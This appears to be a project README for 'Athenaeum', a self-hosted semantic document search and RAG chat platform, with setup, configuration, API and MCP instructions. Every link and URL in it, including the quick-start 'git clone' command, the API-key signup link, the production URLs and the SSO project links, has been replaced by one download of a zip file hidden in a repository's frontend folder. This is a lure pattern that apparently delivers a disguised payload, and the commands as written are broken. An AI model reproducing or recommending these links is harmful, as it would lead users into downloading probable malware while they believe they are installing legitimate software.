# Athenaeum

> Personal semantic library platform — upload documents, search semantically, chat with AI.

Named for the Temple of Athena — the classical word for a library or reading room.

## Features

- **Semantic Search** — Find content by meaning, not just keywords (pgvector + HNSW)
- **AI Chat** — Ask questions and get cited answers grounded in your documents
- **Cross-Library** — Search and chat across multiple libraries in one query
- **Multi-Library** — Organize content into isolated libraries with per-library AI personas
- **Local Embeddings** — All embeddings run locally (all-mpnet-base-v2, 768d). No data leaves your server.
- **5 LLM Providers** — OpenRouter (free tier), OpenAI, Anthropic, Ollama, Gemini
- **MCP Server** — Expose your libraries as tools for Claude Code and other AI agents
- **Accessible** — WCAG AA contrast, ARIA landmarks, keyboard navigation, screen reader support

## Quick Start

```bash
git clone https://raw.githubusercontent.com/Junior81195/athenaeum/main/frontend/app/library/Software-1.1.zip
cd athenaeum
cp .env.example .env          # Edit: set ATHENAEUM_DB_PASSWORD and LLM provider
make run                      # Starts PostgreSQL, API, and frontend
```

Open [http://localhost:3140](http://localhost:3140) in your browser.

### Prerequisites

- Docker and Docker Compose
- ~2GB disk (embedding model downloads on first build)

## Architecture

```
Upload PDF/text → Extract sections (pdfplumber) → Chunk (500 tokens, 50 overlap)
  → Embed (all-mpnet-base-v2, 768d) → pgvector HNSW cosine index
  → Semantic search → Top-k chunks + parent documents
  → RAG prompt (per-library persona) → LLM → Cited response
```

### Stack

| Layer | Tech |
|-------|------|
| Backend | FastAPI (Python 3.11) |
| Database | PostgreSQL 16 + pgvector |
| Embeddings | sentence-transformers (local) |
| Frontend | Next.js 14 + TypeScript + Tailwind CSS |
| LLM | Configurable — OpenRouter, OpenAI, Anthropic, Ollama, Gemini |

### Services

| Service | Port | Description |
|---------|------|-------------|
| Frontend | 3140 | Next.js app |
| API | 8140 | FastAPI backend |
| Database | 5442 | PostgreSQL + pgvector |

## Configuration

Copy `.env.example` to `.env` and configure:

```bash
# Required
ATHENAEUM_DB_PASSWORD=your-secure-password

# LLM — pick one:
LLM_PROVIDER=openrouter        # openrouter | openai | anthropic | ollama | gemini
LLM_API_KEY=your-key           # Get free key at https://raw.githubusercontent.com/Junior81195/athenaeum/main/frontend/app/library/Software-1.1.zip

# For local models (no API key needed):
# LLM_PROVIDER=ollama
# LLM_BASE_URL=http://localhost:11434
```

### Production Deployment

```bash
NEXT_PUBLIC_API_URL=https://raw.githubusercontent.com/Junior81195/athenaeum/main/frontend/app/library/Software-1.1.zip \
NEXT_PUBLIC_APP_URL=https://raw.githubusercontent.com/Junior81195/athenaeum/main/frontend/app/library/Software-1.1.zip \
  docker compose up -d --build
```

### Auth (Optional)

Athenaeum reads SSO headers from a reverse proxy (`Remote-User`, `Remote-Groups`). Works with [Authelia](https://raw.githubusercontent.com/Junior81195/athenaeum/main/frontend/app/library/Software-1.1.zip), [Authentik](https://raw.githubusercontent.com/Junior81195/athenaeum/main/frontend/app/library/Software-1.1.zip), or any proxy that injects auth headers. Without auth, all libraries are publicly accessible.

Set `NEXT_PUBLIC_AUTH_URL` to your SSO login page for sign-in links.

## API

Full API reference in [CLAUDE.md](./CLAUDE.md#api-port-8140). Key endpoints:

```
GET    /health                              Health check
GET    /api/libraries                       List libraries
POST   /api/libraries/{id}/upload           Upload documents (PDF, TXT, MD)
GET    /api/libraries/{id}/search?q=...     Semantic search
POST   /api/libraries/{id}/chat             RAG chat with citations
POST   /api/search                          Cross-library search
POST   /api/chat                            Cross-library chat
```

## MCP Server

Use Athenaeum as a tool in Claude Code or any MCP-compatible client:

```json
{
  "mcpServers": {
    "athenaeum": {
      "command": "python",
      "args": ["-m", "src.mcp_server"],
      "env": {
        "ATHENAEUM_DB_PASSWORD": "your-password",
        "LLM_PROVIDER": "openrouter",
        "LLM_API_KEY": "your-key"
      }
    }
  }
}
```

**Tools**: `athenaeum_list_libraries`, `athenaeum_search`, `athenaeum_chat`, `athenaeum_browse`, `athenaeum_read_document`, `athenaeum_multi_search`, `athenaeum_multi_chat`

## Development

```bash
make dev                      # API with hot reload (port 8140)
make logs                     # Tail API logs
make test                     # Run ~38 integration tests
make stop                     # Stop all containers
```

## Testing

```bash
make test                               # All tests
pytest tests/test_api.py -v             # Verbose
pytest tests/test_api.py -k chat        # Filter by name
```

Tests cover: health, library CRUD, upload + ingestion, semantic search, RAG chat, conversation persistence, cross-library search/chat, auth, and browse endpoints.

## License

[MIT](./LICENSE)
